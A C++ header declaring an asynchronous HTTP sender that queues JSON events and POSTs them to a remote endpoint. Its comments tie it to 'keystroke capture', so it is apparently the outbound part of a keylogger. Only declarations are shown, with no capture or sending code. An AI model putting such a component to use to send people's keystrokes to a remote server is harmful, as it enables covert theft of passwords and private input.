#pragma once

#include <atomic>
#include <condition_variable>
#include <deque>
#include <mutex>
#include <string>
#include <thread>

namespace net {

enum class Mode {
    Off,
    Mirror,
    NetOnly,
};

struct SenderConfig {
    std::string endpoint;        // http://host:port/path
    int         timeoutMs = 5000;
    int         retryMax  = 3;
};

// Asynchronous, best-effort HTTP sender. Owns a background thread that drains
// a queue and POSTs JSON events to the configured endpoint.
//
// Never blocks the caller and never signals failure back to keystroke capture.
class Sender {
public:
    Sender();
    ~Sender();

    bool start(const SenderConfig& cfg, std::string& errorOut);
    void enqueue(const std::string& jsonObject);
    void stop();

    long long sent()    const { return m_sent.load(); }
    long long dropped() const { return m_dropped.load(); }

private:
    void workerLoop();
    bool sendOne(const std::string& body, std::string& errorOut);

    SenderConfig                  m_cfg;
    std::thread                   m_thread;
    std::mutex                    m_mu;
    std::condition_variable       m_cv;
    std::deque<std::string>       m_queue;
    std::atomic<bool>             m_running{false};
    std::atomic<bool>             m_stopFlag{false};
    std::atomic<long long>        m_sent{0};
    std::atomic<long long>        m_dropped{0};

    std::string m_host;
    int         m_port = 0;
    std::string m_path;
};

}  // namespace net
